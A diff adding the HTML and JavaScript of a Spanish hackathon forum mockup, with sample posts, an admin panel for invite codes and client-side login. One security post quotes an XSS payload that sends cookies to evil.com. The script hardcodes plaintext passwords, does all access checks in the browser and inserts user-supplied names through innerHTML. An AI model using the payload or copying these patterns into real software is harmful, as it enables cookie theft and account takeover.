+          <button class="sort-btn" onclick="setSort(this)">📈 Top</button>
+        </div>
+        <div class="quick-compose">
+          <div class="qc-av" id="qcAv">U</div>
+          <div class="qc-input" onclick="openPostModal()">Crear un post...</div>
+          <button class="btn btn-orange btn-sm" onclick="openPostModal()">Post</button>
+        </div>
+        <div id="postsFeed">
+
+          <div class="post-card" id="pc-1">
+            <div class="vote-col">
+              <button class="vote-up" onclick="doVote(event,'pc-1','up')">▲</button>
+              <span class="vote-num" id="vn-pc-1">247</span>
+              <button class="vote-dn" onclick="doVote(event,'pc-1','dn')">▼</button>
+            </div>
+            <div class="post-main">
+              <div class="post-meta">
+                <span class="post-sub">r/almai</span>·
+                <span>por <span class="post-by">u/alumno01</span></span>·
+                <span class="rank-badge rank-member">● MEMBER</span>·
+                <span class="flair flair-tech">💻 Tech</span>·
+                <span>hace 2 min</span>
+              </div>
+              <div class="post-title" onclick="toggleExpand('pc-1')">🎉 Backend Docker levantado — /api/mensajes devuelve 200</div>
+              <div class="post-preview">Acabo de conseguir que el backend con Express + SQLite arranque en Docker. El endpoint responde con 200 y devuelve el JSON sin stack traces.</div>
+              <div class="post-actions">
+                <button class="act-btn" onclick="toggleExpand('pc-1')">💬 <span id="cn-pc-1">3</span> comentarios</button>
+                <button class="act-btn">🔗 Compartir</button>
+                <button class="act-btn">⭐ Guardar</button>
+              </div>
+              <div class="post-expanded" id="pe-pc-1">
+                <div class="post-full">Acabo de conseguir que el backend con Express + SQLite arranque correctamente en Docker. El endpoint /api/mensajes responde con 200.
+
+El truco fue usar <code>better-sqlite3</code> en lugar de <code>sqlite3</code> — es síncrono y más fácil de debuggear.</div>
+                <div class="reply-box">
+                  <textarea placeholder="Añade un comentario..." maxlength="500" oninput="rchr(this)"></textarea>
+                  <div class="reply-box-footer">
+                    <span class="reply-char">0/500</span>
+                    <button class="btn btn-gray btn-sm">Cancelar</button>
+                    <button class="btn btn-orange btn-sm" onclick="addComment('pc-1',this)">Comentar</button>
+                  </div>
+                </div>
+                <div id="cm-pc-1">
+                  <div class="comment"><div class="c-line"></div><div class="c-body">
+                    <div class="c-meta"><span class="c-author">u/javi_k</span><span class="rank-badge rank-mod">● MOD</span><span class="c-score">12 pts</span><span>hace 1 min</span></div>
+                    <div class="c-text">Buen trabajo. Ojo con el <code>JWT_SECRET</code> hardcodeado en docker-compose — debería ir en un <code>.env</code>.</div>
+                    <div class="c-actions"><button class="c-vote-up" onclick="cvote(this)">▲</button><span class="c-score">12</span><button class="c-vote-dn" onclick="cvote(this)">▼</button><button class="c-act">Responder</button></div>
+                  </div></div>
+                  <div class="comment"><div class="c-line"></div><div class="c-body">
+                    <div class="c-meta"><span class="c-author">u/sara_r</span><span class="rank-badge rank-member">● MEMBER</span><span>hace 1 min</span></div>
+                    <div class="c-text">¿Tienes volumes? Sin eso el SQLite desaparece al hacer <code>docker-compose down</code>.</div>
+                    <div class="c-actions"><button class="c-vote-up" onclick="cvote(this)">▲</button><span class="c-score">8</span><button class="c-vote-dn" onclick="cvote(this)">▼</button><button class="c-act">Responder</button></div>
+                  </div></div>
+                  <div class="comment"><div class="c-line"></div><div class="c-body">
+                    <div class="c-meta"><span class="c-author">u/maria_r</span><span class="rank-badge rank-member">● MEMBER</span><span>hace 30 seg</span></div>
+                    <div class="c-text">¿Cómo tienes el CORS? ¿Solo para localhost:8080?</div>
+                    <div class="c-actions"><button class="c-vote-up" onclick="cvote(this)">▲</button><span class="c-score">5</span><button class="c-vote-dn" onclick="cvote(this)">▼</button><button class="c-act">Responder</button></div>
+                  </div></div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="post-card" id="pc-2">
+            <div class="vote-col">
+              <button class="vote-up" onclick="doVote(event,'pc-2','up')">▲</button>
+              <span class="vote-num" id="vn-pc-2">183</span>
+              <button class="vote-dn" onclick="doVote(event,'pc-2','dn')">▼</button>
+            </div>
+            <div class="post-main">
+              <div class="post-meta">
+                <span class="post-sub">r/almai</span>·
+                <span>por <span class="post-by">u/javi_k</span></span>·
+                <span class="rank-badge rank-mod">● MOD</span>·
+                <span class="flair flair-sec">🔒 Seguridad</span>·
+                <span>hace 15 min</span>
+              </div>
+              <div class="post-title" onclick="toggleExpand('pc-2')">⚠️ innerHTML + input de usuario = XSS crítica. Os lo aviso antes de la auditoría</div>
+              <div class="post-preview">Cualquier foro que use innerHTML para mostrar posts será explotable la semana que viene. La solución es usar textContent o escapeHtml().</div>
+              <div class="post-actions">
+                <button class="act-btn" onclick="toggleExpand('pc-2')">💬 <span id="cn-pc-2">2</span> comentarios</button>
+                <button class="act-btn">🔗 Compartir</button>
+                <button class="act-btn">⭐ Guardar</button>
+              </div>
+              <div class="post-expanded" id="pe-pc-2">
+                <div class="post-full">Payload básico: <code>&lt;img src=x onerror="fetch('https://evil.com?c='+document.cookie)"&gt;</code>
+
+❌ elem.innerHTML = userInput
+✅ elem.textContent = userInput</div>
+                <div class="reply-box"><textarea placeholder="Comentar..." maxlength="500" oninput="rchr(this)"></textarea><div class="reply-box-footer"><span class="reply-char">0/500</span><button class="btn btn-orange btn-sm" onclick="addComment('pc-2',this)">Comentar</button></div></div>
+                <div id="cm-pc-2">
+                  <div class="comment"><div class="c-line"></div><div class="c-body">
+                    <div class="c-meta"><span class="c-author">u/alumno01</span><span class="rank-badge rank-member">● MEMBER</span><span>hace 10 min</span></div>
+                    <div class="c-text">Confirmado, nosotros usamos <code>escapeHtml()</code> con textContent.</div>
+                    <div class="c-actions"><button class="c-vote-up" onclick="cvote(this)">▲</button><span class="c-score">21</span><button class="c-vote-dn" onclick="cvote(this)">▼</button><button class="c-act">Responder</button></div>
+                  </div></div>
+                  <div class="comment"><div class="c-line"></div><div class="c-body">
+                    <div class="c-meta"><span class="c-author">u/sara_r</span><span class="rank-badge rank-member">● MEMBER</span><span>hace 8 min</span></div>
+                    <div class="c-text">¿Y el IDOR en DELETE? Si solo compruebas ownership en frontend, Burp lo explota.</div>
+                    <div class="c-actions"><button class="c-vote-up" onclick="cvote(this)">▲</button><span class="c-score">9</span><button class="c-vote-dn" onclick="cvote(this)">▼</button><button class="c-act">Responder</button></div>
+                  </div></div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="post-card" id="pc-3">
+            <div class="vote-col">
+              <button class="vote-up" onclick="doVote(event,'pc-3','up')">▲</button>
+              <span class="vote-num" id="vn-pc-3">91</span>
+              <button class="vote-dn" onclick="doVote(event,'pc-3','dn')">▼</button>
+            </div>
+            <div class="post-main">
+              <div class="post-meta">
+                <span class="post-sub">r/almai</span>·
+                <span>por <span class="post-by">u/sara_r</span></span>·
+                <span class="rank-badge rank-member">● MEMBER</span>·
+                <span class="flair flair-tip">💡 Tip</span>·
+                <span>hace 32 min</span>
+              </div>
+              <div class="post-title" onclick="toggleExpand('pc-3')">💡 Añadid volumes al docker-compose o perderéis la BD al reiniciar</div>
+              <div class="post-preview">Si no tenéis volumes, cada docker-compose down borra el SQLite. La solución son tres líneas en el compose.</div>
+              <div class="post-actions">
+                <button class="act-btn" onclick="toggleExpand('pc-3')">💬 <span id="cn-pc-3">1</span> comentario</button>
+                <button class="act-btn">🔗 Compartir</button>
+              </div>
+              <div class="post-expanded" id="pe-pc-3">
+                <div class="post-full">En docker-compose.yml añadid:
+  volumes:
+    - ./backend/database.db:/app/database.db
+
+Y añadid el .db al .gitignore.</div>
+                <div class="reply-box"><textarea placeholder="Comentar..." maxlength="500" oninput="rchr(this)"></textarea><div class="reply-box-footer"><span class="reply-char">0/500</span><button class="btn btn-orange btn-sm" onclick="addComment('pc-3',this)">Comentar</button></div></div>
+                <div id="cm-pc-3">
+                  <div class="comment"><div class="c-line"></div><div class="c-body">
+                    <div class="c-meta"><span class="c-author">u/javi_k</span><span class="rank-badge rank-mod">● MOD</span><span>hace 20 min</span></div>
+                    <div class="c-text">También añadid el archivo al <code>.dockerignore</code>.</div>
+                    <div class="c-actions"><button class="c-vote-up" onclick="cvote(this)">▲</button><span class="c-score">17</span><button class="c-vote-dn" onclick="cvote(this)">▼</button><button class="c-act">Responder</button></div>
+                  </div></div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- FEEDBACK TAB -->
+      <div id="pFb" style="display:none">
+        <div class="fb-composer">
+          <div class="fb-type-tabs">
+            <button class="fb-type-tab active" id="ftt-op" onclick="fbTab('op')">💬 Opinión</button>
+            <button class="fb-type-tab" id="ftt-sg" onclick="fbTab('sg')">💡 Sugerencia</button>
+            <button class="fb-type-tab" id="ftt-bg" onclick="fbTab('bg')">🐛 Bug</button>
+          </div>
+          <div class="fb-body">
+            <div class="fb-field"><label>Título</label><input id="fbT" type="text" placeholder="Resume en una frase..." maxlength="120"></div>
+            <div class="fb-field"><label>Categoría</label>
+              <div class="chips">
+                <button class="chip" onclick="toggleChip(this)">UI/UX</button>
+                <button class="chip" onclick="toggleChip(this)">Rendimiento</button>
+                <button class="chip" onclick="toggleChip(this)">Seguridad</button>
+                <button class="chip" onclick="toggleChip(this)">Nueva función</button>
+                <button class="chip" onclick="toggleChip(this)">Otro</button>
+              </div>
+            </div>
+            <div class="fb-field" id="fbStarsWrap"><label>Valoración</label><div class="stars" id="fbStars"><button class="star" onclick="setStar(1)">★</button><button class="star" onclick="setStar(2)">★</button><button class="star" onclick="setStar(3)">★</button><button class="star" onclick="setStar(4)">★</button><button class="star" onclick="setStar(5)">★</button></div></div>
+            <div class="fb-field"><label>Descripción</label><textarea id="fbB" placeholder="Explica con detalle..." maxlength="600"></textarea></div>
+            <button class="btn btn-orange" style="width:100%" onclick="submitFb()">Enviar feedback</button>
+          </div>
+        </div>
+        <div id="fbFeed">
+          <div class="fb-card"><div class="fb-bar sec"></div>
+            <div class="vote-col" style="background:transparent"><button class="vote-up" onclick="doVote(event,'fb-1','up')">▲</button><span class="vote-num" id="vn-fb-1">14</span><button class="vote-dn" onclick="doVote(event,'fb-1','dn')">▼</button></div>
+            <div class="post-main">
+              <div class="post-meta"><span class="post-by">u/javi_k</span>·<span class="rank-badge rank-mod">● MOD</span>·<span class="flair flair-sec">Seguridad</span>·<span>hace 1h</span></div>
+              <div class="post-title" style="font-size:.9rem">Rate limiting en /api/login para prevenir fuerza bruta</div>
+              <div class="post-preview">Sin límite de intentos cualquiera puede lanzar un ataque de diccionario. Propongo express-rate-limit con max 10 intentos / IP / 15 min.</div>
+              <div class="post-actions"><button class="act-btn">💬 2</button><button class="act-btn">🔗 Compartir</button></div>
+            </div>
+          </div>
+          <div class="fb-card"><div class="fb-bar ux"></div>
+            <div class="vote-col" style="background:transparent"><button class="vote-up" onclick="doVote(event,'fb-2','up')">▲</button><span class="vote-num" id="vn-fb-2">9</span><button class="vote-dn" onclick="doVote(event,'fb-2','dn')">▼</button></div>
+            <div class="post-main">
+              <div class="post-meta"><span class="post-by">u/maria_r</span>·<span class="rank-badge rank-member">● MEMBER</span>·<span class="flair flair-tech">UI/UX</span>·<span>★★★★★</span>·<span>hace 45 min</span></div>
+              <div class="post-title" style="font-size:.9rem">Me encanta el diseño — sugiero añadir paginación o infinite scroll</div>
+              <div class="post-preview">Con muchos posts el feed se va a hacer muy largo. Paginación o infinite scroll mejorarían la experiencia.</div>
+              <div class="post-actions"><button class="act-btn">💬 1</button><button class="act-btn">🔗 Compartir</button></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ADMIN PANEL -->
+      <div id="pAdmin" style="display:none">
+        <div class="s-card" style="margin-bottom:.85rem">
+          <div class="s-head">🔑 Generador de códigos de invitación</div>
+          <div class="s-body">
+            <p style="font-size:.8rem;color:var(--text-2);margin-bottom:.75rem">Como <strong style="color:var(--orange)">ADMIN</strong> o <strong style="color:var(--r-mod)">MOD</strong> puedes generar códigos de un solo uso para que nuevos usuarios se registren.</p>
+            <div style="display:flex;gap:.5rem;align-items:center;margin-bottom:1rem">
+              <select id="codeRank" style="background:var(--bg2);border:1px solid var(--border);border-radius:4px;color:var(--text);padding:.4rem .6rem;font-size:.8rem;outline:none;flex:1">
+                <option value="newbie">Newbie</option>
+                <option value="member" selected>Member</option>
+                <option value="veteran">Veteran</option>
+                <option value="mod" id="modOption">Mod</option>
+              </select>
+              <button class="btn btn-orange btn-sm" onclick="genCode()">+ Generar código</button>
+            </div>
+            <table class="code-table" id="codeTable">
+              <thead><tr><th>Código</th><th>Rango destino</th><th>Estado</th><th>Generado por</th></tr></thead>
+              <tbody id="codeTbody"></tbody>
+            </table>
+          </div>
+        </div>
+
+        <div class="s-card">
+          <div class="s-head">👥 Gestión de usuarios</div>
+          <div class="s-body">
+            <table class="code-table" id="usersTable">
+              <thead><tr><th>Usuario</th><th>Rango</th><th>Karma</th><th>Acción</th></tr></thead>
+              <tbody id="usersTbody"></tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+
+    </main>
+
+    <!-- SIDEBAR -->
+    <aside class="sidebar">
+
+      <!-- Mariscos Recio -->
+      <div class="recio-wrap" onclick="showToast('🦐 Pedido transmitido — Mariscos Recio')">
+        <div class="recio-cover">PATROCINADO · MARISCOS RECIO</div>
+        <div class="recio-body">
+          <div class="recio-logo">
+            <svg viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg" style="width:52px;height:52px">
+              <rect width="52" height="52" fill="#000d1a"/>
+              <rect x="0" y="0" width="52" height="10" fill="#001f5c"/>
+              <text x="26" y="7.5" text-anchor="middle" font-family="Arial Black,sans-serif" font-size="5" font-weight="900" fill="#00aaff">MARISCOS</text>
+              <ellipse cx="26" cy="28" rx="9" ry="6" fill="#002b80"/>
+              <ellipse cx="26" cy="21" rx="5.5" ry="5" fill="#002b80"/>
+              <circle cx="23.5" cy="18.5" r="1.4" fill="#001133"/>
+              <circle cx="28.5" cy="18.5" r="1.4" fill="#001133"/>
+              <circle cx="23.7" cy="18.3" r="0.5" fill="#00aaff"/>
+              <circle cx="28.7" cy="18.3" r="0.5" fill="#00aaff"/>
+              <line x1="23" y1="16.5" x2="16" y2="11" stroke="#0055bb" stroke-width="0.9"/>
+              <line x1="29" y1="16.5" x2="36" y2="11" stroke="#0055bb" stroke-width="0.9"/>
+              <circle cx="16" cy="11" r="1.2" fill="#00aaff"/>
+              <circle cx="36" cy="11" r="1.2" fill="#00aaff"/>
+              <path d="M17,26 Q11,23 9,26 Q11,30 17,28 Z" fill="#001f5c"/>
+              <path d="M35,26 Q41,23 43,26 Q41,30 35,28 Z" fill="#001f5c"/>
+              <line x1="20" y1="32" x2="15" y2="37" stroke="#001f5c" stroke-width="1.2"/>
+              <line x1="23" y1="33" x2="19" y2="38" stroke="#001f5c" stroke-width="1.2"/>
+              <line x1="32" y1="32" x2="37" y2="37" stroke="#001f5c" stroke-width="1.2"/>
+              <line x1="29" y1="33" x2="33" y2="38" stroke="#001f5c" stroke-width="1.2"/>
+              <ellipse cx="26" cy="35" rx="6.5" ry="3.5" fill="#002277"/>
+              <ellipse cx="26" cy="39" rx="4.5" ry="2.5" fill="#001a5c"/>
+              <ellipse cx="26" cy="43" rx="3" ry="2" fill="#002277"/>
+              <path d="M23,44 Q18,48 15,45 Q20,41 23,44Z" fill="#001a5c"/>
+              <path d="M29,44 Q34,48 37,45 Q32,41 29,44Z" fill="#001a5c"/>
+              <rect x="0" y="46" width="52" height="6" fill="#001a5c"/>
+              <text x="26" y="51" text-anchor="middle" font-family="Arial Black,sans-serif" font-size="5" font-weight="900" fill="#00ccff">RECIO</text>
+            </svg>
+          </div>
+          <div class="recio-info">
+            <div class="recio-brand"><em>MARISCOS</em> RECIO</div>
+            <div class="recio-tagline">El mar al mejor RE·CIO 🦐</div>
+            <div class="recio-cta">Pedir ahora</div>
+          </div>
+        </div>
+        <div class="recio-foot"><span>Publicidad · Sector 7-G</span><span>🦞 Envío en 24h</span></div>
+      </div>
+
+      <!-- about -->
+      <div class="s-card">
+        <div class="s-head">Acerca de r/almai</div>
+        <div class="s-body">
+          <p style="font-size:.8rem;color:var(--text-2);line-height:1.6;margin-bottom:.75rem">Foro oficial del Hackathon DAM/DAW 2025. Acceso por invitación. Comparte avances, reporta bugs y debate seguridad web.</p>
+          <div class="s-stat-row"><span class="s-stat-key">Miembros</span><span class="s-stat-val" id="sMiembros">4</span></div>
+          <div class="s-stat-row"><span class="s-stat-key">Online</span><span class="s-stat-val green">2</span></div>
+          <div class="s-stat-row"><span class="s-stat-key">Posts hoy</span><span class="s-stat-val orange" id="sPostCount">3</span></div>
+          <div class="s-stat-row"><span class="s-stat-key">Códigos activos</span><span class="s-stat-val" id="sCodesCount">0</span></div>
+          <div class="s-stat-row"><span class="s-stat-key">Hackathon restante</span><span class="s-stat-val green">8H</span></div>
+          <button class="btn btn-orange" style="width:100%;margin-top:.75rem;border-radius:4px" onclick="openPostModal()">+ Crear post</button>
+        </div>
+      </div>
+
+      <!-- rangos -->
+      <div class="s-card">
+        <div class="s-head">🏅 Rangos</div>
+        <div class="s-body" style="padding:.5rem .85rem">
+          <div class="rank-row"><span class="rank-badge rank-admin">● ADMIN</span><span class="rank-row-name">Administrador</span><span class="rank-row-pts">Genera códigos · gestiona</span></div>
+          <div class="rank-row"><span class="rank-badge rank-mod">● MOD</span><span class="rank-row-name">Moderador</span><span class="rank-row-pts">Genera códigos</span></div>
+          <div class="rank-row"><span class="rank-badge rank-veteran">● VETERAN</span><span class="rank-row-name">Veterano</span><span class="rank-row-pts">500+ karma</span></div>
+          <div class="rank-row"><span class="rank-badge rank-member">● MEMBER</span><span class="rank-row-name">Miembro</span><span class="rank-row-pts">100+ karma</span></div>
+          <div class="rank-row"><span class="rank-badge rank-newbie">● NEWBIE</span><span class="rank-row-name">Nuevo</span><span class="rank-row-pts">recién llegado</span></div>
+        </div>
+      </div>
+
+      <!-- online -->
+      <div class="s-card">
+        <div class="s-head">Online ahora</div>
+        <div class="s-body" style="padding:.5rem .85rem">
+          <div class="online-item"><div class="pip on"></div><span id="sideMe">tú</span><span class="rank-badge rank-newbie" id="sideMeRank" style="margin-left:.3rem">● NEWBIE</span></div>
+          <div class="online-item"><div class="pip on"></div>u/javi_k<span class="rank-badge rank-mod" style="margin-left:.3rem">● MOD</span></div>
+          <div class="online-item"><div class="pip idle"></div>u/maria_r<span class="rank-badge rank-member" style="margin-left:.3rem">● MEMBER</span></div>
+          <div class="online-item"><div class="pip off"></div>u/alumno01<span class="rank-badge rank-member" style="margin-left:.3rem">● MEMBER</span></div>
+        </div>
+      </div>
+
+      <!-- rules -->
+      <div class="s-card">
+        <div class="s-head">Normas del sub</div>
+        <div class="s-body" style="padding:.5rem .85rem">
+          <div class="rule-row"><span class="rule-n">1</span><span class="rule-t">Valida siempre en backend</span></div>
+          <div class="rule-row"><span class="rule-n">2</span><span class="rule-t">No exponer stack traces</span></div>
+          <div class="rule-row"><span class="rule-n">3</span><span class="rule-t">Contraseñas hasheadas (bcrypt ≥10)</span></div>
+          <div class="rule-row"><span class="rule-n">4</span><span class="rule-t">Secrets en .env, no en el código</span></div>
+          <div class="rule-row"><span class="rule-n">5</span><span class="rule-t">No innerHTML con input de usuario</span></div>
+        </div>
+      </div>
+
+    </aside>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// ════════════════════════════════════════════
+//  STATE
+// ════════════════════════════════════════════
+const RANKS = {
+  newbie:  { label:'NEWBIE',  cls:'rank-newbie',  canGenerate:false, canGenerateMod:false },
+  member:  { label:'MEMBER',  cls:'rank-member',  canGenerate:false, canGenerateMod:false },
+  veteran: { label:'VETERAN', cls:'rank-veteran', canGenerate:false, canGenerateMod:false },
+  mod:     { label:'MOD',     cls:'rank-mod',     canGenerate:true,  canGenerateMod:false },
+  admin:   { label:'ADMIN',   cls:'rank-admin',   canGenerate:true,  canGenerateMod:true  },
+};
+
+const USERS = [
+  { username:'admin',    password:'admin123',    rank:'admin',   karma:1240 },
+  { username:'javi_k',   password:'javi1234',    rank:'mod',     karma:892  },
+  { username:'alumno01', password:'password123', rank:'member',  karma:247  },
+  { username:'maria_r',  password:'maria2025',   rank:'member',  karma:183  },
+  { username:'sara_r',   password:'sara2025',    rank:'newbie',  karma:41   },
+];
+
+// invite codes: { code, rank, usedBy, createdBy }
+const CODES = [
+  { code:'ALMAI-2025', rank:'member', usedBy:null,       createdBy:'admin' },
+  { code:'HACK-D4M1',  rank:'member', usedBy:'alumno01', createdBy:'admin' },
+  { code:'SEC-AUDIT1', rank:'veteran',usedBy:null,       createdBy:'javi_k'},
+];
+
+let ME = null;
+let starVal = 0;
+let postCount = 3;
+
+// ════════════════════════════════════════════
+//  AUTH
+// ════════════════════════════════════════════
+function gTab(t) {
+  document.getElementById('gTabIn').classList.toggle('active', t==='in');
+  document.getElementById('gTabUp').classList.toggle('active', t==='up');
+  document.getElementById('gFormIn').style.display = t==='in' ? 'block' : 'none';
+  document.getElementById('gFormUp').style.display = t==='up' ? 'block' : 'none';
+  clearGErr();
+}
+function clearGErr() {
+  const el = document.getElementById('gErr'); el.textContent=''; el.classList.remove('show');
+  ['lUser','lPass','rCode','rUser','rPass','rPass2'].forEach(id => {
+    const e=document.getElementById(id); if(e) e.classList.remove('err');
+  });
+  ['lUserE','lPassE','rCodeE','rUserE','rPassE','rPass2E'].forEach(id => {
+    const e=document.getElementById(id); if(e){e.style.display='none';e.textContent='';}
+  });
+}
+function gErr(msg) {
+  const el=document.getElementById('gErr'); el.textContent=msg;
+  el.classList.remove('show'); void el.offsetWidth; el.classList.add('show');
+}
+function fErr(iid, eid, msg) {
+  document.getElementById(iid).classList.add('err');
+  const e=document.getElementById(eid); e.textContent=msg; e.style.display='block';
+}
+
+function doLogin() {
+  clearGErr();
+  const u=document.getElementById('lUser').value.trim();
+  const p=document.getElementById('lPass').value;
+  let ok=true;
+  if(!u){fErr('lUser','lUserE','Usuario requerido');ok=false;}
+  if(!p){fErr('lPass','lPassE','Contraseña requerida');ok=false;}
+  if(!ok) return;
+  const usr=USERS.find(x=>x.username===u);
+  if(!usr||usr.password!==p){gErr('Credenciales incorrectas');document.getElementById('lPass').value='';return;}
+  enterForum(usr);
+}
+
+function doRegister() {
+  clearGErr();
+  const code  = document.getElementById('rCode').value.trim().toUpperCase();
+  const uname = document.getElementById('rUser').value.trim();
+  const pass  = document.getElementById('rPass').value;
+  const pass2 = document.getElementById('rPass2').value;
+  let ok=true;
+  if(!code){fErr('rCode','rCodeE','Código requerido');ok=false;}
+  if(uname.length<3){fErr('rUser','rUserE','Mínimo 3 caracteres');ok=false;}
+  if(pass.length<6){fErr('rPass','rPassE','Mínimo 6 caracteres');ok=false;}
+  if(pass!==pass2){fErr('rPass2','rPass2E','No coinciden');ok=false;}
+  if(!ok) return;
+
+  const codeObj = CODES.find(c=>c.code===code&&!c.usedBy);
+  if(!codeObj){gErr('Código inválido o ya usado');return;}
+  if(USERS.find(x=>x.username===uname)){gErr('Ese usuario ya existe');return;}
+
+  const newUser={username:uname, password:pass, rank:codeObj.rank, karma:0};
+  USERS.push(newUser);
+  codeObj.usedBy=uname;
+
+  showToast(`✓ Cuenta creada con rango ${RANKS[codeObj.rank].label}`);
+  updateCodesCount();
+  setTimeout(()=>{gTab('in');document.getElementById('lUser').value=uname;},700);
+}
+
+function enterForum(usr) {
+  ME=usr;
+  document.getElementById('authGate').style.animation='fadeOut .25s ease forwards';
+  setTimeout(()=>{
+    document.getElementById('authGate').style.display='none';
+    document.getElementById('forumApp').style.display='block';
+    // nav
+    const ini=usr.username.slice(0,2).toUpperCase();
+    const r=RANKS[usr.rank];
+    document.getElementById('navAv').textContent=ini;
+    document.getElementById('navAv').style.background=getrankColor(usr.rank);
+    document.getElementById('navUsername').textContent='u/'+usr.username;
+    document.getElementById('navKarma').textContent=usr.karma+' karma · '+r.label;
+    document.getElementById('qcAv').textContent=ini;
+    document.getElementById('qcAv').style.background=getrankColor(usr.rank);
+    document.getElementById('sideMe').textContent='u/'+usr.username;
+    document.getElementById('sideMeRank').className='rank-badge '+r.cls;
+    document.getElementById('sideMeRank').textContent='● '+r.label;
+    // show admin tab if rank allows
+    if(r.canGenerate) {
+      document.getElementById('tAdmin').style.display='';
+      // hide mod option if not admin
+      if(!r.canGenerateMod) document.getElementById('modOption').style.display='none';
+    }
+    updateCodesCount();
+    renderUsersTable();
+    showToast('✓ Bienvenido, u/'+usr.username+' ['+r.label+']');
+  },250);
+}
+
+function doLogout() {
+  ME=null;
+  document.getElementById('forumApp').style.display='none';
+  const g=document.getElementById('authGate');
+  g.style.display='flex'; g.style.animation='fadeIn .25s ease';
+  document.getElementById('lUser').value='';
+  document.getElementById('lPass').value='';
+  document.getElementById('tAdmin').style.display='none';
+  clearGErr(); showToast('Sesión cerrada');
+}
+
+function getrankColor(rank) {
+  const m={newbie:'#4a4a4b',member:'#0068b5',veteran:'#c94a1a',mod:'#2d9445',admin:'#cc3300'};
+  return m[rank]||'#444';
+}
+
+// ════════════════════════════════════════════
+//  CODES
+// ════════════════════════════════════════════
+function genCode() {
+  if(!ME||!RANKS[ME.rank].canGenerate){showToast('Sin permisos',true);return;}
+  const rank=document.getElementById('codeRank').value;
+  if(rank==='mod'&&!RANKS[ME.rank].canGenerateMod){showToast('Solo ADMIN puede generar códigos de MOD',true);return;}
+  const code=[rnd(4),rnd(4)].join('-');
+  CODES.push({code,rank,usedBy:null,createdBy:ME.username});
+  renderCodesTable();
+  updateCodesCount();
+  showToast('✓ Código generado: '+code);
+}
+function rnd(n){
+  const chars='ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+  return Array.from({length:n},()=>chars[Math.floor(Math.random()*chars.length)]).join('');
+}
+function renderCodesTable() {
+  const tbody=document.getElementById('codeTbody'); tbody.innerHTML='';
+  [...CODES].reverse().forEach(c=>{
+    const tr=document.createElement('tr');
+    tr.innerHTML=`
+      <td><span class="code-val ${c.usedBy?'code-used':''}">${c.code}</span></td>
+      <td><span class="rank-badge rank-${c.rank}">● ${RANKS[c.rank].label}</span></td>
+      <td>${c.usedBy?`<span class="badge-used">usado por ${c.usedBy}</span>`:'<span class="badge-free">disponible</span>'}</td>
+      <td style="color:var(--text-2);font-size:.72rem">u/${c.createdBy}</td>`;
+    tbody.appendChild(tr);
+  });
+}
+function updateCodesCount() {
+  const free=CODES.filter(c=>!c.usedBy).length;
+  document.getElementById('sCodesCount').textContent=free;
+}
+
+// ════════════════════════════════════════════
+//  USERS TABLE (admin)
+// ════════════════════════════════════════════
+function renderUsersTable() {
+  const tbody=document.getElementById('usersTbody'); tbody.innerHTML='';
+  USERS.forEach(u=>{
+    const r=RANKS[u.rank];
+    const isMe=ME&&ME.username===u.username;
+    const tr=document.createElement('tr');
+    tr.innerHTML=`
+      <td style="font-weight:600;color:var(--text)">u/${u.username}${isMe?' <span style="color:var(--orange);font-size:.65rem">(tú)</span>':''}</td>
+      <td><span class="rank-badge ${r.cls}">● ${r.label}</span></td>
+      <td class="code-val">${u.karma}</td>
+      <td>${(!isMe&&ME&&RANKS[ME.rank].canGenerate)?`<button class="btn btn-gray btn-sm" onclick="promoteUser('${u.username}')" style="font-size:.62rem">Promover</button>`:'—'}</td>`;
+    tbody.appendChild(tr);
+  });
+}
+function promoteUser(username) {
+  if(!ME||!RANKS[ME.rank].canGenerate) return;
+  const order=['newbie','member','veteran','mod','admin'];
+  const u=USERS.find(x=>x.username===username);
+  if(!u) return;
+  const idx=order.indexOf(u.rank);
+  if(idx>=order.length-1){showToast('Ya tiene el rango máximo',true);return;}
+  const next=order[idx+1];
+  if(next==='admin'&&!RANKS[ME.rank].canGenerateMod){showToast('Solo ADMIN puede promover a ADMIN',true);return;}
+  if(next==='mod'&&!RANKS[ME.rank].canGenerateMod&&ME.rank!=='admin'){showToast('Solo ADMIN puede promover a MOD',true);return;}
+  u.rank=next;
+  renderUsersTable();
+  showToast(`✓ ${username} promovido a ${RANKS[next].label}`);
+}
+
+// ════════════════════════════════════════════
+//  TABS
+// ════════════════════════════════════════════
+function mainTab(t) {
+  const map={feed:'pFeed',fb:'pFb',admin:'pAdmin'};
+  Object.entries(map).forEach(([k,id])=>{
+    document.getElementById(id).style.display=k===t?'block':'none';
+    document.getElementById('t'+k.charAt(0).toUpperCase()+k.slice(1)).classList.toggle('active',k===t);
+  });
+  if(t==='admin'){renderCodesTable();renderUsersTable();}
+}
+function setSort(btn){document.querySelectorAll('.sort-btn').forEach(b=>b.classList.remove('active'));btn.classList.add('active');}
+function fbTab(t){['op','sg','bg'].forEach(x=>{document.getElementById('ftt-'+x).classList.toggle('active',x===t);});
+  document.getElementById('fbStarsWrap').style.display=t==='op'?'block':'none';}
+
+// ════════════════════════════════════════════
+//  POSTS
+// ════════════════════════════════════════════
+function openPostModal(){if(!ME)return showToast('Inicia sesión primero',true);document.getElementById('postModal').classList.add('open');}
+function closePostModal(){document.getElementById('postModal').classList.remove('open');}
+function submitPost(){
+  const title=document.getElementById('pTitle').value.trim();
+  const body=document.getElementById('pBody').value.trim();
+  if(!title) return showToast('El título es obligatorio',true);
+  const selectedFlair=[...document.querySelectorAll('#postModal .chip.on')].map(c=>c.dataset.flair||c.textContent.trim());
+  const id='pc-'+Date.now();
+  const r=RANKS[ME.rank];
+  const flairHtml=selectedFlair.map(f=>{
+    const map={TECH:'flair-tech',SEC:'flair-sec',TIP:'flair-tip',DEBATE:'flair-debate'};
+    return `<span class="flair ${map[f]||'flair-tech'}">${f}</span>`;
+  }).join(' ');
+  const card=document.createElement('div');
+  card.className='post-card'; card.id=id;
+  card.innerHTML=`
+    <div class="vote-col">
+      <button class="vote-up" onclick="doVote(event,'${id}','up')">▲</button>
+      <span class="vote-num" id="vn-${id}">1</span>
+      <button class="vote-dn" onclick="doVote(event,'${id}','dn')">▼</button>
+    </div>
+    <div class="post-main">
+      <div class="post-meta">
+        <span class="post-sub">r/almai</span>·
